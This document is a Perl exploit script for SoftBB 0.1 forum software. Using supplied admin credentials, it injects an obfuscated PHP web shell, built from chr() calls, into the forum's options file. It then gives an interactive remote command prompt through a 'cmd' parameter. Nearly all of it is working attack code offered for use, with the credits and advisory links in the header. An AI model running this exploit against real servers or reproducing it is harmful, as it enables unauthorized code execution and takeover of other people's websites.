SoftBB 0.1 (cmd) Remote Command Execution Exploit
=================================================



#!/usr/bin/perl
#
# Affected.scr..: SoftBB 0.1
# Poc.ID........: 11060904
# Type..........: PHP code execution, SQL Injection, Full Path Disclosure
# Risk.level....: High
# Vendor.Status.: Unpatched
# Src.download..: softbb.be
# Poc.link......: acid-root.new.fr/poc/11060904.txt
# Advisory.link.: acid-root.new.fr/advisories/10060904.txt
# Credits.......: DarkFig (vuln/exploit/shellcode)
#
use Getopt::Long;
use HTTP::Cookies;
use HTTP::Request;
use HTTP::Request::Common "POST";
use HTTP::Response;
use LWP::UserAgent;

print STDOUT "\n+", &#039;-&#039; x 69, "+\n";
print STDOUT "|            SoftBB 0.1 Remote PHP Code Execution Exploit             |\n";
print STDOUT &#039;+&#039;, &#039;-&#039; x 69, "+\n";

my($host,$path,$admin,$passwd,$proxh,$proxu,$proxp);
my $opt = GetOptions(
   &#039;host=s&#039;   =>  \$host,
   &#039;path=s&#039;   =>  \$path,
   &#039;admin=s&#039;  =>  \$admin,
   &#039;passwd=s&#039; =>  \$passwd,
   &#039;proxh=s&#039;  =>  \$proxh,
   &#039;proxu=s&#039;  =>  \$proxu,
   &#039;proxp=s&#039;  =>  \$proxp);
   
if(!$host or !$admin or !$passwd) {
    print STDOUT "| Usage: ./xx.pl --host=[www] --path=[/] --admin=[root] --passwd=[XD] |\n";
    print STDOUT "| [Options] : --proxh=[host] --proxu=[username] --proxp=[password] ---|\n";
    print STDOUT &#039;+&#039;, &#039;-&#039; x 69, "+\n";
    exit(0);
}

if($host  !~ /http/) {$host = &#039;http://&#039;.$host;}
if($proxh !~ /http/ && $proxh != &#039;&#039;) {$proxh = &#039;http://&#039;.$proxh.&#039;/&#039;;}
if(!$path) {$path = &#039;/&#039;;}

my $cc = HTTP::Cookies->new();
my $ua = LWP::UserAgent->new();
   $ua->cookie_jar($cc);
   $ua->agent(&#039;0xzilla&#039;);
   $ua->timeout(30);
   $ua->proxy([&#039;http&#039;] => $proxh) if $proxh;

my $re = POST $host.$path.&#039;login.php&#039;, [
         &#039;pseudolog&#039; => $admin,
         &#039;mdp&#039;       => $passwd,
         &#039;souvenir&#039;  => &#039;auto&#039;,
         &#039;Submit&#039;    => &#039;Connexion&#039;
         ];
   $re->proxy_authorization_basic($proxu, $proxp) if $proxp;
   $ua->request($re);

my $re = $ua->get($host.$path.&#039;admin/gest_opt.php&#039;);

if($re->content =~ /Administration/) {
   print STDOUT " [+]Login successful";} else {
   print STDOUT " [-]Error during login";
   print STDOUT &#039;+&#039;, &#039;-&#039; x 69, "+\n";
   exit(0);}

if($re->content =~ /<input type="text" name="nomduforum"  value="(.*?)" class="bouton" \/>/) {
   $conf[0] = $1;} else {
   $conf[0] = &#039;Titre&#039;;}

if($re->content =~ /<input type="text" name="mailadmin" value="(.*?)" class="bouton" \/>/) {
   $conf[1] = $1; } else {
   $conf[1] = &#039;root@you.com&#039;;}

   # Bypass magic_quotes_gpc and register_globals limits
   # if(isset($_GET[&#039;cmd&#039;])){system(stripslashes($_GET[&#039;cmd&#039;]));}

my $shcode  = "\n".&#039;$shcode  = chr(0x69).chr(0x66).chr(0x28).chr(0x69).chr(0x73).chr(0x73).chr(0x65);&#039;;
   $shcode .= "\n".&#039;$shcode .= chr(0x74).chr(0x28).chr(0x24).chr(0x5F).chr(0x47).chr(0x45).chr(0x54);&#039;;
   $shcode .= "\n".&#039;$shcode .= chr(0x5B).chr(0x27).chr(0x63).chr(0x6D).chr(0x64).chr(0x27).chr(0x5D);&#039;;
   $shcode .= "\n".&#039;$shcode .= chr(0x29).chr(0x29).chr(0x7B).chr(0x73).chr(0x79).chr(0x73).chr(0x74);&#039;;
   $shcode .= "\n".&#039;$shcode .= chr(0x65).chr(0x6D).chr(0x28).chr(0x73).chr(0x74).chr(0x72).chr(0x69);&#039;;
   $shcode .= "\n".&#039;$shcode .= chr(0x70).chr(0x73).chr(0x6C).chr(0x61).chr(0x73).chr(0x68).chr(0x65);&#039;;
   $shcode .= "\n".&#039;$shcode .= chr(0x73).chr(0x28).chr(0x24).chr(0x5F).chr(0x47).chr(0x45).chr(0x54);&#039;;
   $shcode .= "\n".&#039;$shcode .= chr(0x5B).chr(0x27).chr(0x63).chr(0x6D).chr(0x64).chr(0x27).chr(0x5D);&#039;;
   $shcode .= "\n".&#039;$shcode .= chr(0x29).chr(0x29).chr(0x3B).chr(0x7D).chr(0x0D).chr(0x0A);&#039;;
   $shcode .= "\n".&#039;eval($shcode);//&#039;;

my $re = POST $host.$path.&#039;admin/save_opt.php&#039;, [
         &#039;nomduforum&#039;       => $conf[0],        &#039;url&#039;              => $host.$path,
         &#039;mailadmin&#039;        => $conf[1],        &#039;smtp&#039;             => &#039;&#039;,
         &#039;nbsondage&#039;        => 0,               &#039;gzip&#039;             => &#039;false&#039;,
         &#039;autmodpseudo&#039;     => &#039;false&#039;,         &#039;afflistdelauto&#039;   => &#039;true&#039;,
         &#039;autorisationsign&#039; => &#039;true&#039;,          &#039;bbcodesign&#039;       => &#039;true&#039;,
         &#039;ipaff&#039;            => &#039;true&#039;,          &#039;affreprapide&#039;     => &#039;false&#039;,
         &#039;mailconf&#039;         => &#039;false&#039;,         &#039;cache_forum&#039;      => "false; $shcode",
         &#039;lockforum&#039;        => &#039;false&#039;,         &#039;message_de_lock&#039;  => &#039;&#039;,
         &#039;lmax&#039;             => 0,               &#039;hmax&#039;             => 0,
         &#039;pmax&#039;             => 0,               &#039;tmpfreepost&#039;      => 0,
         &#039;membreparpage&#039;    => 0,               &#039;postparpage&#039;      => 0,
         &#039;postparpageaff&#039;   => 0,               &#039;Submit&#039;           => &#039;Enregistrer+les+options&#039;,
         ];

my $da = $ua->request($re);
if($da->content =~ /Enregistrement/) {
   print STDOUT "\n [+]Shellcode should be written !";}
   
while () {
       print STDOUT "\n \$sh: ";
       chomp($cmd = <STDIN>);
       my $da = $ua->get($host.$path."info_options.php?cmd=$cmd");
       print STDOUT $da->content;
       if($cmd eq "exit") {
          print STDOUT &#039;+&#039;, &#039;-&#039; x 69, "+\n";
          exit(0);}
}



